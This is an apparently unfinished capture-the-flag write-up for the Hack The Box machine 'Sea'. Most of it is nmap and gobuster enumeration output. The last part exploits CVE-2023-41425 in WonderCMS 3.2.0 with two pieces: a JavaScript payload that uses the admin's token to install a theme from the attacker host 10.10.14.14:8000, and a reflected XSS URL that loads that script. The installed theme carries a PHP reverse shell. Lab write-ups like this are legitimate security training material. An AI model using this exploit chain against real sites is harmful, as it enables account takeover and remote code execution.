---
name: Sea
published: false
---

```
$ sudo nmap -sV -sC 10.10.11.28
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 16:41 CET
Nmap scan report for 10.10.11.28
Host is up (0.0081s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
```

```
$ sudo nmap -p- 10.10.11.28
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 16:55 CET
Nmap scan report for sea.htb (10.10.11.28)
Host is up (0.0065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.72 seconds
```

Just SSH and Apache waiting for us.

```
$ gobuster dir --url http://10.10.11.28/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.28/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/0                    (Status: 200) [Size: 3670]
/404                  (Status: 200) [Size: 3361]
/Documents and Settings (Status: 403) [Size: 199]
/Program Files        (Status: 403) [Size: 199]
/data                 (Status: 301) [Size: 232] [--> http://10.10.11.28/data/]
/home                 (Status: 200) [Size: 3670]
/index.php            (Status: 200) [Size: 3670]
/messages             (Status: 301) [Size: 236] [--> http://10.10.11.28/messages/]
/plugins              (Status: 301) [Size: 235] [--> http://10.10.11.28/plugins/]
/reports list         (Status: 403) [Size: 199]
/server-status        (Status: 403) [Size: 199]
/themes               (Status: 301) [Size: 234] [--> http://10.10.11.28/themes/]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```

I'm interested mostly in those `301`'s. They seem to point to the trailing-slash version of themselves which seems to indicate they are directories. I will run more `gobuster` on each of them, picking a bigger wordlist than before to make sure we get everything.

```
$ gobuster dir --url http://sea.htb/data --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/data
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 234] [--> http://sea.htb/data/files/]
/home                 (Status: 200) [Size: 3650]
/404                  (Status: 200) [Size: 3341]
/Reports List         (Status: 403) [Size: 199]
/external files       (Status: 403) [Size: 199]
/Style Library        (Status: 403) [Size: 199]
/modern mom           (Status: 403) [Size: 199]
/neuf giga photo      (Status: 403) [Size: 199]
/Web References       (Status: 403) [Size: 199]
/My Project           (Status: 403) [Size: 199]
/Contact Us           (Status: 403) [Size: 199]
/Donate Cash          (Status: 403) [Size: 199]
/Home Page            (Status: 403) [Size: 199]
/Planned Giving       (Status: 403) [Size: 199]
/Press Releases       (Status: 403) [Size: 199]
/Privacy Policy       (Status: 403) [Size: 199]
/Site Map             (Status: 403) [Size: 199]
/About Us             (Status: 403) [Size: 199]
/Bequest Gift         (Status: 403) [Size: 199]
/Gift Form            (Status: 403) [Size: 199]
/Life Income Gift     (Status: 403) [Size: 199]
/New Folder           (Status: 403) [Size: 199]
/Site Assets          (Status: 403) [Size: 199]
/What is New          (Status: 403) [Size: 199]
Progress: 23570 / 30001 (78.56%)[ERROR] parse "http://sea.htb/data/error\x1f_log": net/url: invalid control character in URL
Progress: 30000 / 30001 (100.00%)
===============================================================
Finished
===============================================================

$ gobuster dir --url http://sea.htb/themes/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 3650]
/404                  (Status: 200) [Size: 3341]
/Reports List         (Status: 403) [Size: 199]
/external files       (Status: 403) [Size: 199]
/Style Library        (Status: 403) [Size: 199]
/bike                 (Status: 301) [Size: 235] [--> http://sea.htb/themes/bike/]
/modern mom           (Status: 403) [Size: 199]
/neuf giga photo      (Status: 403) [Size: 199]
/Web References       (Status: 403) [Size: 199]
/My Project           (Status: 403) [Size: 199]
/Contact Us           (Status: 403) [Size: 199]
/Donate Cash          (Status: 403) [Size: 199]
/Home Page            (Status: 403) [Size: 199]
/Planned Giving       (Status: 403) [Size: 199]
/Press Releases       (Status: 403) [Size: 199]
/Privacy Policy       (Status: 403) [Size: 199]
/Site Map             (Status: 403) [Size: 199]
/About Us             (Status: 403) [Size: 199]
/Bequest Gift         (Status: 403) [Size: 199]
/Gift Form            (Status: 403) [Size: 199]
/Life Income Gift     (Status: 403) [Size: 199]
/New Folder           (Status: 403) [Size: 199]
/Site Assets          (Status: 403) [Size: 199]
/What is New          (Status: 403) [Size: 199]
Progress: 23573 / 30001 (78.57%)[ERROR] parse "http://sea.htb/themes/error\x1f_log": net/url: invalid control character in URL
Progress: 30000 / 30001 (100.00%)
===============================================================
Finished
===============================================================
```

We find two more directories: `/data/files` and `/themes/bike`! Let's dive deeper once more:

```
gobuster dir --url http://sea.htb/data/files --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/data/files
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.                    (Status: 403) [Size: 199]
/.html                (Status: 403) [Size: 199]
/.php                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htm                 (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/wp-forum.phps        (Status: 403) [Size: 199]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htuser              (Status: 403) [Size: 199]
/.ht                  (Status: 403) [Size: 199]
/.htc                 (Status: 403) [Size: 199]
/Copy of index.html   (Status: 403) [Size: 199]
Progress: 17129 / 17130 (99.99%)
===============================================================
Finished
===============================================================
```

`/data/files` comes out to a dead end, there's nothing here.

```
$ gobuster dir --url http://sea.htb/themes/bike --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/bike
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.                    (Status: 403) [Size: 199]
/.html                (Status: 403) [Size: 199]
/.php                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htm                 (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/wp-forum.phps        (Status: 403) [Size: 199]
/theme.php            (Status: 500) [Size: 227]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htuser              (Status: 403) [Size: 199]
/.ht                  (Status: 403) [Size: 199]
/.htc                 (Status: 403) [Size: 199]
/Copy of index.html   (Status: 403) [Size: 199]
Progress: 17129 / 17130 (99.99%)
===============================================================
Finished
===============================================================

┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir --url http://sea.htb/themes/bike --wordlist /usr/share/seclists/Discovery/Web-Content/quickhits.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/bike
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/quickhits.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/%3f/                 (Status: 403) [Size: 199]
/.ht_wsr.txt          (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htaccess-local      (Status: 403) [Size: 199]
/.htaccess-dev        (Status: 403) [Size: 199]
/.htaccess-marco      (Status: 403) [Size: 199]
/.htaccess.BAK        (Status: 403) [Size: 199]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htaccess.bak1       (Status: 403) [Size: 199]
/.htaccess.save       (Status: 403) [Size: 199]
/.htaccess.old        (Status: 403) [Size: 199]
/.htaccess.orig       (Status: 403) [Size: 199]
/.htaccess.sample     (Status: 403) [Size: 199]
/.htaccess.txt        (Status: 403) [Size: 199]
/.htaccess_extra      (Status: 403) [Size: 199]
/.htaccess_orig       (Status: 403) [Size: 199]
/.htaccess_sc         (Status: 403) [Size: 199]
/.htaccessBAK         (Status: 403) [Size: 199]
/.htaccessOLD         (Status: 403) [Size: 199]
/.htaccessOLD2        (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/.htaccess~           (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd-old        (Status: 403) [Size: 199]
/.htpasswd_test       (Status: 403) [Size: 199]
/.htusers             (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/admin%20/            (Status: 403) [Size: 199]
/index.phps           (Status: 403) [Size: 199]
/New%20Folder         (Status: 403) [Size: 199]
/New%20folder%20(2)   (Status: 403) [Size: 199]
/Read%20Me.txt        (Status: 403) [Size: 199]
/README.md            (Status: 200) [Size: 318]
/sym/root/home/       (Status: 200) [Size: 3650]
/version              (Status: 200) [Size: 6]
Progress: 2565 / 2566 (99.96%)
===============================================================
Finished
===============================================================
```

`/themes/bike` at first looks just as dissapointing, but when we run with the `quickhits` wordlist we find two files and another directory available!

I went back and checked `/data/files` with `quickhits, it gives up the sane `/sym/root/home` folder:

```
$ gobuster dir --url http://sea.htb/data/files --wordlist /usr/share/seclists/Discovery/Web-Content/quickhits.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/data/files
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/quickhits.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/%3f/                 (Status: 403) [Size: 199]
/.ht_wsr.txt          (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htaccess-dev        (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htaccess-local      (Status: 403) [Size: 199]
/.htaccess.BAK        (Status: 403) [Size: 199]
/.htaccess-marco      (Status: 403) [Size: 199]
/.htaccess.save       (Status: 403) [Size: 199]
/.htaccess.sample     (Status: 403) [Size: 199]
/.htaccess.orig       (Status: 403) [Size: 199]
/.htaccess.bak1       (Status: 403) [Size: 199]
/.htaccess.old        (Status: 403) [Size: 199]
/.htaccess.bak        (Status: 403) [Size: 199]
/.htaccess.txt        (Status: 403) [Size: 199]
/.htaccess_orig       (Status: 403) [Size: 199]
/.htaccess_extra      (Status: 403) [Size: 199]
/.htaccessOLD2        (Status: 403) [Size: 199]
/.htaccess~           (Status: 403) [Size: 199]
/.htgroup             (Status: 403) [Size: 199]
/.htaccess_sc         (Status: 403) [Size: 199]
/.htaccessBAK         (Status: 403) [Size: 199]
/.htaccessOLD         (Status: 403) [Size: 199]
/.htpasswd_test       (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd-old        (Status: 403) [Size: 199]
/.htusers             (Status: 403) [Size: 199]
/.htpasswds           (Status: 403) [Size: 199]
/admin%20/            (Status: 403) [Size: 199]
/index.phps           (Status: 403) [Size: 199]
/New%20Folder         (Status: 403) [Size: 199]
/New%20folder%20(2)   (Status: 403) [Size: 199]
/Read%20Me.txt        (Status: 403) [Size: 199]
/sym/root/home/       (Status: 200) [Size: 3650]
Progress: 2565 / 2566 (99.96%)
===============================================================
Finished
===============================================================
```

In `version` we can see the version is `3.2.0` which is vulnerable to CVE-2023-41425.

We'll build a `xss.js`:

```js
var url = "http://sea.htb";
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev =
  url +
  "/?installModule=http://10.10.14.14:8000/shelly.zip.zip&directoryName=violet&type=themes&token=" +
  token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function () {
  if (xhr3.status == 200) {
    var xhr4 = new XMLHttpRequest();
    xhr4.withCredentials = true;
    xhr4.open("GET", url + "/themes/shelly/revo.php");
    xhr4.send();
    xhr4.onload = function () {
      if (xhr4.status == 200) {
        var xhr5 = new XMLHttpRequest();
        xhr5.withCredentials = true;
        xhr5.open("GET", url + "/themes/shelly/revo.php");
        xhr5.send();
      }
    };
  }
};
```

We'll place a PHP reverse shell in `shelly/revo.php`, then ZIP it up to a archive in our web server directory.

```
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.14:8000/xss.js"></script><form+action="
```
